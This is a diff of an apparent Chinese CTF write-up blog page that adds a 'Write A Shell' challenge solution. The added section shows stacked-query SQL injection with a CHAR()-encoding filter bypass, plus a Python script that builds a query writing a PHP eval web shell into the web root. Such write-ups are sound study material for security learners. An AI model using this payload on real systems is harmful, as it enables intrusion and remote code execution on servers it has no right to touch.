@@ -62,7 +62,7 @@
 	
 	<!-- others: such as change-bg, time... -->
 	<p class="page-name-other">
-		12/3/2018 
+		12/5/2018 
 		<style type="text/css">
 	header:after {
 		content: '';
@@ -594,6 +594,109 @@ echo base64_encode(serialize($sky));
 <p><img src="https://p1.ssl.qhimg.com/t014c420fc5c456c8cb.png" alt=""></p>
 <p>即可无需目录名getflag</p>
 <p><img src="https://p1.ssl.qhimg.com/t01f73478c123fd3cb9.png" alt=""></p>
+<h4 id="Write-A-Shell"><a href="#Write-A-Shell" class="headerlink" title="Write A Shell"></a>Write A Shell</h4><p>居然是多行注入…想不到想不到</p>
+<p>EXECUTE 子句<br>正好最近在学数据库原理。赶紧搞一下。</p>
+<p>实际上，SQL可以执行一些预定义的语句，需要先SET 一个变量，之后PREPARE 来准备语句，利用 EXECUTE 执行。</p>
+<pre><code>mysql&gt; SET @A=&quot;SELECT database()&quot;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; PREPARE st FROM  @A;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+mysql&gt; EXECUTE st;
++------------+
+| database() |
++------------+
+| WEB|
++------------+
+</code></pre><p>当然，可以用准备过的sql语句，如下所示。</p>
+<pre><code>mysql&gt; SET @a = &quot;SELECT 1,?,? as shaobao&quot;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; PREPARE st FROM @a;
+
+mysql&gt; SET @a=10;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; SET @b=11;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; EXECUTE st USING @a,@b;
++---+----+---------+
+| 1 | ?  | shaobao |
++---+----+---------+
+| 1 | 10 | 11  |
++---+----+---------+
+1 row in set (0.00 sec)
+</code></pre><p><strong>多行注入脱裤</strong></p>
+<p>发现加个分号正常执行，这就是一个很典型的多行注入了。当初没有向这个方向去思考。</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/n2txidyaz08cwn8cam5fp1sp/TIM%E6%88%AA%E5%9B%BE20181128002155.png" alt=""></p>
+<p>之后，就是绕过各种waf了，首先单引号之类的全部被加了 slash。但是可以用concat(char()..)的形式绕过。</p>
+<p>此外各种关键词被替换成了 @@ 所幸的是 SELECT EXEC AS 子句还是可以使用的。</p>
+<p>最后是一些逻辑运算符号，比如^&amp;*%$被换成了@，但是可以利用这个特性去构造变量符号@</p>
+<pre><code>import requests 
+
+Query0 = &quot;SET ^a=&quot;
+Query1_raw = &quot;SELECT 1,2,3,4,5&quot;
+Query1_pass_waf = &quot;concat({})&quot;
+Query2 = &quot;;PREPARE st from ^a;EXECUTE st;&quot;
+
+tmp_str = &quot;&quot;
+for i in Query1_raw:
+tmp_str+=&quot;CHAR({}),&quot;.format(ord(i))
+
+print(Query0+Query1_pass_waf.format(tmp_str[0:-1])+Query2)
+</code></pre><p>想要注入的轻松，脚本就要这么写。我们发现 select 1,2,3,4,5能够成功执行</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/rioss3jyoqep5jkp0iifpv6a/TIM%E6%88%AA%E5%9B%BE20181128093144.png" alt=""></p>
+<p><strong>Web Shell</strong></p>
+<p>之后就是各种查询了，题目提示是写shell，那么就要有写权限。</p>
+<p>查询当前用户的权限。可以打开pma看一眼</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/iqbe0sjhm5x7b07p5r2dg20e/TIM%E6%88%AA%E5%9B%BE20181128093727.png" alt=""></p>
+<p>好的，目标很明确，语句应该如下所示：</p>
+<pre><code>SELECT GRANTEE,PRIVILEGE_TYPE,3,4,IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=&#39;FILE&#39;
++--------------------+----------------+---+---+--------------+
+| GRANTEE| PRIVILEGE_TYPE | 3 | 4 | IS_GRANTABLE |
++--------------------+----------------+---+---+--------------+
+| &#39;root&#39;@&#39;localhost&#39; | FILE   | 3 | 4 | YES  |
++--------------------+----------------+---+---+--------------+
+
+user_id:&#39;ctf666&#39;@&#39;localhost&#39;
+
+user_name:FILE
+
+注册时间：NO
+</code></pre><p>之后查询文件写的路径</p>
+<pre><code>mysql&gt; show variables like &quot;%secure_file_priv%&quot;;
++------------------+----------------+
+| Variable_name| Value  |
++------------------+----------------+
+| secure_file_priv | c:\wamp64\tmp\ |
++------------------+----------------+
+
+user_id:secure_file_priv
+
+user_name:/var/www/
+
+注册时间：
+</code></pre><p>最后写文件，我们发现头像目录是可写的，最终结果如下</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/o6eaxh6qhnpk5yu5krf94p3b/TIM%E6%88%AA%E5%9B%BE20181128100153.png" alt=""></p>
+<p>完整脚本如下：</p>
+<pre><code>import requests 
+
+Query0 = &quot;SET ^a=&quot;
+# Query1_raw = &quot;SELECT GRANTEE,PRIVILEGE_TYPE,3,4,IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=&#39;FILE&#39;&quot;
+# Query1_raw = &quot;show variables like &#39;%secure_file_priv%&#39;&quot;
+Query1_raw = &quot;SELECT &#39;&lt;?php eval($_POST[&#39;h&#39;]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shaobao.php&#39;&quot;
+Query1_pass_waf = &quot;concat({})&quot;
+Query2 = &quot;;PREPARE st from ^a;EXECUTE st;&quot;
+
+tmp_str = &quot;&quot;
+for i in Query1_raw:
+tmp_str+=&quot;CHAR({}),&quot;.format(ord(i))
+
+print(Query0+Query1_pass_waf.format(tmp_str[0:-1])+Query2)
+</code></pre><p><strong>flag：flag{f6c5acfd4192b4152661d19b411d2d63}</strong></p>
 <h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Numeric-Password"><a href="#Numeric-Password" class="headerlink" title="Numeric Password"></a>Numeric Password</h4><p>题目描述：</p>
 <p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，</p>
 <p>想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p>
@@ -821,7 +924,7 @@ print flag
 				
 				
 				<!--toc(post.content)-->
-				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#签到题——-手速要快"><span class="post-toc-text">签到题—— 手速要快</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#image-up"><span class="post-toc-text">image_up</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#好黑的黑名单"><span class="post-toc-text">好黑的黑名单</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#interesting-web"><span class="post-toc-text">interesting web</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ezsql"><span class="post-toc-text">ezsql</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MISC"><span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Numeric-Password"><span class="post-toc-text">Numeric Password</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#我的公子在何方"><span class="post-toc-text">我的公子在何方</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大吉大利今晚吃鸡"><span class="post-toc-text">大吉大利今晚吃鸡</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#仿射"><span class="post-toc-text">仿射</span></a></li></ol></li></ol></li></ol>
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#签到题——-手速要快"><span class="post-toc-text">签到题—— 手速要快</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#image-up"><span class="post-toc-text">image_up</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#好黑的黑名单"><span class="post-toc-text">好黑的黑名单</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#interesting-web"><span class="post-toc-text">interesting web</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ezsql"><span class="post-toc-text">ezsql</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Write-A-Shell"><span class="post-toc-text">Write A Shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MISC"><span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Numeric-Password"><span class="post-toc-text">Numeric Password</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#我的公子在何方"><span class="post-toc-text">我的公子在何方</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大吉大利今晚吃鸡"><span class="post-toc-text">大吉大利今晚吃鸡</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#仿射"><span class="post-toc-text">仿射</span></a></li></ol></li></ol></li></ol>
 			</nav>
 			<div class="post-toc-bar"><div>
 		</div></div></aside>
